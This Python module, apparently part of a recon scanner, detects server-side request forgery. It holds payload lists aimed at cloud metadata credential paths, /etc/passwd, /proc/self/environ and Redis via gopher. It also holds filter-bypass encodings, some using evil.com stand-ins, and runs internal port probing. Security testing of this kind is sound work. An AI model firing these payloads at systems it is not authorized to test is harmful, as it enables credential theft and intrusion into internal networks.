"""
modules/ssrf_detector.py - Server-Side Request Forgery Detection
Detects SSRF vulnerabilities by testing URL/redirect parameters.
"""

import re
import logging
import urllib.parse
from typing import Dict, List, Any, Optional
from core.http_engine import HTTPClient
from core.state_manager import StateManager

logger = logging.getLogger("recon.ssrf_detector")


class SSRFDetector:
    """
    Detects Server-Side Request Forgery (SSRF) vulnerabilities.

    Tests parameters that accept URLs or hostnames for SSRF:
    - url, src, dest, redirect, uri, continue, callback
    - file, doc, template, content, parse, html, data
    - host, port, url_path, feed, find, q, search
    """

    SSRF_PAYLOADS = [
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.azure.com/api/v1/",
        "http://169.254.169.254/metadata/v1/",            # DigitalOcean
        "http://100.100.100.200/latest/meta-data/",        # Alibaba Cloud
        "http://metadata.tencentyun.com/latest/meta-data/",
        "file:///etc/passwd",
        "file:///etc/hosts",
        "file:///proc/self/environ",
        "dict://127.0.0.1:11211/stats",
        "gopher://127.0.0.1:6379/_INFO%0D%0A",            # Redis via gopher
        "http://127.0.0.1:8080/",                         # Internal HTTP
        "http://127.0.0.1:8443/",
        "http://127.0.0.1:9200/",                         # Elasticsearch
        "http://127.0.0.1:27017/",                        # MongoDB
    ]

    # Blind SSRF: common internal ports to probe
    INTERNAL_PORTS = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 8888, 9200, 27017]

    # Bypass encodings for common SSRF filters
    SSRF_BYPASS_PAYLOADS = [
        "http://①②⑦.⓪.⓪.①/",         # Unicode bypass
        "http://0177.0.0.01/",            # Octal bypass
        "http://0x7f.0x0.0x0.0x1/",       # Hex bypass
        "http://2130706433/",              # Integer bypass (127.0.0.1)
        "http://127.1/",                   # Short form
        "http://[0:0:0:0:0:ffff:127.0.0.1]/",  # IPv6 mapped
        "http://localhost.evil.com@127.0.0.1/",  # @ bypass
        "http://127.0.0.1#.evil.com/",
        "http://evil.com?.127.0.0.1/",
    ]

    SSRF_PARAM_NAMES = {
        "url",
        "src",
        "dest",
        "redirect",
        "uri",
        "continue",
        "callback",
        "file",
        "doc",
        "template",
        "content",
        "parse",
        "html",
        "data",
        "host",
        "port",
        "url_path",
        "feed",
        "find",
        "q",
        "search",
        "reference",
        "site",
        "html",
        "val",
        "validate",
        "domain",
        "callback",
        "return",
        "page",
        "feed",
        "host",
        "port",
        "next",
        "data",
        "address",
        "branch",
        "redirect_uri",
        "relay_url",
        "service",
        "continue",
        "action",
        "navigation",
        "open",
        "output",
    }

    def __init__(self, state: StateManager = None, http_client: HTTPClient = None):
        self.state = state
        self.http_client = http_client or HTTPClient()
        self.findings = []

    def detect(self, endpoints: List[Any], progress_cb=None) -> Dict[str, Any]:
        """
        Scan endpoints for SSRF vulnerabilities (including blind SSRF).

        Args:
            endpoints: List of endpoint dicts or URLs
            progress_cb: Optional progress callback

        Returns:
            Dict with vulnerabilities and metadata
        """
        logger.info(f"[SSRF] Starting SSRF detection on {len(endpoints)} endpoints")

        results = {
            "vulnerabilities": [],
            "endpoints_tested": 0,
            "ssrf_confirmed": 0,
        }

        for i, endpoint in enumerate(endpoints):
            if progress_cb:
                progress_cb(i, len(endpoints))

            if isinstance(endpoint, dict):
                url = endpoint.get("url") or endpoint.get("endpoint")
                raw_params = endpoint.get("parameters") or endpoint.get("query_params") or []
                if isinstance(raw_params, dict):
                    params = list(raw_params.keys())
                else:
                    params = list(raw_params)
            else:
                url = str(endpoint)
                params = []

            if not url:
                continue

            # Check if URL has SSRF-susceptible parameters
            parsed = urllib.parse.urlparse(url)
            url_params = list(urllib.parse.parse_qs(parsed.query).keys())

            # Combine endpoint params with URL params
            all_params = list(set(params + url_params))

            # Check each SSRF-susceptible parameter
            for param in all_params:
                if param.lower() in self.SSRF_PARAM_NAMES:
                    ssrf_result = self._test_ssrf(url, param)
                    if ssrf_result.get("vulnerable"):
                        results["vulnerabilities"].append(ssrf_result)
                        results["ssrf_confirmed"] += 1
                    else:
                        # Try bypass payloads if basic test failed
                        bypass_result = self._test_ssrf_bypass(url, param)
                        if bypass_result.get("vulnerable"):
                            results["vulnerabilities"].append(bypass_result)
                            results["ssrf_confirmed"] += 1
                    # Also test blind SSRF via internal port probing
                    blind_result = self._test_blind_ssrf(url, param)
                    if blind_result.get("vulnerable"):
                        results["vulnerabilities"].append(blind_result)
                        results["ssrf_confirmed"] += 1

            results["endpoints_tested"] += 1

        logger.info(f"[SSRF] Found {results['ssrf_confirmed']} SSRF vulnerabilities")
        return results

    def _test_ssrf(self, url: str, param: str) -> Dict[str, Any]:
        """Test a specific parameter for SSRF"""
        result = {
            "url": url,
            "parameter": param,
            "vulnerable": False,
            "confidence": 0.0,
            "evidence": [],
            "payloads_tested": 0,
        }

        for payload in self.SSRF_PAYLOADS[:5]:  # Test first 5 payloads
            result["payloads_tested"] += 1
            try:
                test_url = self._inject_param(url, param, payload)
                response = self.http_client.get(test_url, timeout=10)

                # Check for SSRF indicators
                indicators = self._check_ssrf_indicators(response, payload)

                if indicators["score"] > 0.3:
                    result["vulnerable"] = True
                    result["confidence"] = indicators["score"]
                    result["evidence"].append(
                        {
                            "payload": payload,
                            "indicator": indicators["reason"],
                            "status": response.status_code,
                        }
                    )

                    if result["confidence"] >= 0.7:
                        break

            except Exception as e:
                logger.debug(f"[SSRF] Error testing {param} on {url}: {e}")
                continue

        return result

    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject a payload into the parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        params[param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)

        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _check_ssrf_indicators(self, response, payload: str) -> Dict[str, Any]:
        """Check response for SSRF indicators"""
        score = 0.0
        reason = ""
        text = response.text.lower() if hasattr(response, "text") else ""

        # Check for cloud metadata service responses
        cloud_metadata_patterns = [
            ("ami-id", "AWS EC2 metadata"),
            ("availability-zone", "AWS EC2 metadata"),
            ("security-credentials", "AWS IAM credentials"),
            ("computemetadata", "GCP metadata"),
            ("subscription", "Azure metadata"),
            ("instance-id", "Cloud instance metadata"),
        ]
        for pattern, label in cloud_metadata_patterns:
            if pattern in text:
                score += 0.7
                reason = f"Cloud metadata exposed: {label}"
                break

        # Check for localhost responses
        if any(x in text for x in ["localhost", "127.0.0.1", "root:", "admin:", "www-data"]):
            score = max(score, 0.6)
            reason = reason or "Internal service response"

        # File read indicators
        if re.search(r"root:x:0:0|daemon:x:|bin:x:", text):
            score = 0.95
            reason = "/etc/passwd content exposed via SSRF"

        # Check for error messages indicating SSRF processing
        if any(
            x in text
            for x in ["connection refused", "network is unreachable", "no route to host"]
        ):
            score = max(score, 0.4)
            reason = reason or "Network error from internal probe"

        # Check status code
        if response.status_code in [200, 301, 302] and score > 0:
            score = min(score + 0.1, 1.0)
        elif response.status_code in [400, 502, 503]:
            score = max(score, 0.2)
            reason = reason or "Gateway error on SSRF payload"

        return {"score": min(score, 1.0), "reason": reason}

    def _test_ssrf_bypass(self, url: str, param: str) -> Dict[str, Any]:
        """Test SSRF with filter bypass encodings."""
        result = {
            "url": url,
            "parameter": param,
            "vulnerable": False,
            "confidence": 0.0,
            "attack_type": "ssrf_bypass",
            "evidence": [],
        }

        for payload in self.SSRF_BYPASS_PAYLOADS[:5]:
            try:
                test_url = self._inject_param(url, param, payload)
                response = self.http_client.get(test_url, timeout=10)
                indicators = self._check_ssrf_indicators(response, payload)
                if indicators["score"] > 0.4:
                    result["vulnerable"] = True
                    result["confidence"] = indicators["score"]
                    result["evidence"].append({
                        "payload": payload,
                        "indicator": indicators["reason"],
                        "status": response.status_code,
                        "bypass_type": "encoding/unicode",
                    })
                    if result["confidence"] >= 0.7:
                        break
            except Exception as e:
                logger.debug(f"[SSRF] Bypass test error: {e}")
                continue

        return result

    def _test_blind_ssrf(self, url: str, param: str) -> Dict[str, Any]:
        """Test for blind SSRF via internal port probing (timing-based)."""
        import time

        result = {
            "url": url,
            "parameter": param,
            "vulnerable": False,
            "confidence": 0.0,
            "attack_type": "blind_ssrf",
            "evidence": [],
        }

        open_ports = []
        for port in self.INTERNAL_PORTS[:6]:
            payload = f"http://127.0.0.1:{port}/"
            try:
                test_url = self._inject_param(url, param, payload)
                start = time.time()
                response = self.http_client.get(test_url, timeout=8)
                elapsed = time.time() - start
                text = response.text if hasattr(response, "text") else ""

                # Only report if actual service banner is detected in the response body
                service_banners = {
                    22: ["SSH-2.0", "OpenSSH"],
                    3306: ["mysql_native_password", "5.7.", "8.0."],
                    5432: ["PostgreSQL", "FATAL:  password authentication"],
                    6379: ["+PONG\r\n", "-ERR unknown command", "redis_version"],
                    9200: ['"cluster_name"', '"version":{', '"number":"'],
                    27017: ["ismaster", "MongoServerError", "MongoDB"],
                }
                banners = service_banners.get(port, [])
                if any(b in text for b in banners):
                    open_ports.append({"port": port, "banner_detected": True, "elapsed": elapsed})
                    result["vulnerable"] = True
                    result["confidence"] = max(result["confidence"], 0.85)
                    result["evidence"].append({
                        "port": port,
                        "payload": payload,
                        "indicator": f"Service banner detected on port {port}",
                        "elapsed": round(elapsed, 2),
                    })

            except Exception as e:
                logger.debug(f"[SSRF] Blind SSRF port {port} error: {e}")
                continue

        # Only report blind SSRF when actual service banners were detected,
        # not based on timing alone (timing-based detection has very high FP rate)
        return result


def detect_ssrf(
    state: StateManager, endpoints: List[Any], progress_cb=None
) -> Dict[str, Any]:
    """Standalone function for SSRF detection"""
    detector = SSRFDetector(state=state)
    return detector.detect(endpoints, progress_cb)
